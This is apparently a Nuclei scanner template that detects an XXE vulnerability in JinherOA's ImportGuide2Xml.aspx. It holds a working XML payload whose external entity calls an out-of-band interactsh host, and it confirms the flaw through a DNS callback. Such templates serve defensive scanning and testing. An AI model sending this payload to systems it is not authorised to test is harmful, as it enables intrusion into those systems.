id: poc-yaml-jinher-importguide2xml-aspx-xxe
info:
  name: JinherOA ImportGuide2Xml.aspx XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog

variables:
  reverse: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        POST /c6/Jhsoft.Web.Appraise/ImportGuide2Xml.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "https://{{reverse}}/xxe_test">
        %remote;]>
        <root/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
